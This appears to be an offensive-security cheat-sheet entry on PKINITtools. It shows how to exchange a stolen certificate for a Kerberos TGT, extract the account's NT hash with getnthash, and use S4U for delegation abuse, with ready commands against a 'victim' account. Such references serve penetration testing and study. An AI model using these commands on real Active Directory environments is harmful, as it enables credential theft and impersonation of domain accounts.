---
tool: PKINITtools
slug: pkinittools
stages: [post-compromise]
targets: [windows]
category: PKINIT TGTs from certificates on Linux
platforms: [linux]
services: [kerberos]
ports: [88]
tags: [active directory, kerberos, pkinit, certificates, pass-the-certificate, u2u]
attack: [T1550.003, T1558]
summary: dirkjanm's Python toolkit for the PKINIT side of Kerberos. gettgtpkinit exchanges an X.509 certificate for a TGT, getnthash recovers the account's NT hash from that TGT, and gets4uticket does S4U for constrained-delegation abuse. The engine behind every Pass-the-Certificate and Shadow Credentials attack from Linux.
references:
  - PKINITtools on GitHub | https://github.com/dirkjanm/PKINITtools
  - SpecterOps — Certified Pre-Owned | https://posts.specterops.io/certified-pre-owned-d95910965cd2
---

## When to reach for it

You hold a certificate (`.pfx`, often from AD CS abuse, an ESC8 relay, or a Shadow Credential) and want the account's TGT. gettgtpkinit does the PKINIT pre-authentication for you and writes a ccache; from there it is ordinary Pass-the-Ticket. getnthash turns that same TGT back into the NT hash when you want a hash to pass or crack.

## Key tools and flags

- `gettgtpkinit.py -cert-pfx file.pfx [-pfx-pass PASS] DOMAIN/user out.ccache` — cert → TGT.
- It prints an **AS-REP encryption key** — save it; `getnthash` needs it.
- `getnthash.py -key <as-rep-key> DOMAIN/user` — recover the NT hash from the TGT.
- `gets4uticket.py` — S4U2Self/Proxy to mint a service ticket for delegation abuse.

## Commands

Exchange a certificate for a TGT:

```bash
python3 gettgtpkinit.py -cert-pfx victim.pfx -pfx-pass 'PFXPASS' -dc-ip TARGET DOMAIN/victim /tmp/victim.ccache
```

Recover the NT hash from the resulting ticket:

```bash
python3 getnthash.py -key <as-rep-key-from-above> DOMAIN/victim
```

## Workflow

1. Obtain a certificate (see [Pass the Certificate](/cpts/#tool-pass-the-certificate)).
2. Run `gettgtpkinit` to write the ccache; copy the printed AS-REP key.
3. `export KRB5CCNAME=/tmp/victim.ccache` and `klist` to confirm.
4. Reuse the ticket with any `-k` tool, or run `getnthash` to pull the NT hash instead.
5. For delegation paths, use `gets4uticket` to impersonate a user to a target service.

## Notes

If `gettgtpkinit` reports "Error detecting the version of libcrypto", reinstall `oscrypto` from its git source. Certipy's `auth` does the same cert-to-TGT step inside one toolkit, so PKINITtools is the lighter, scriptable option when you already have the PFX. The NT hash out of `getnthash` is handy where a service rejects Kerberos but accepts NTLM. Keep your clock within five minutes of the DC — PKINIT is as skew-sensitive as the rest of Kerberos.
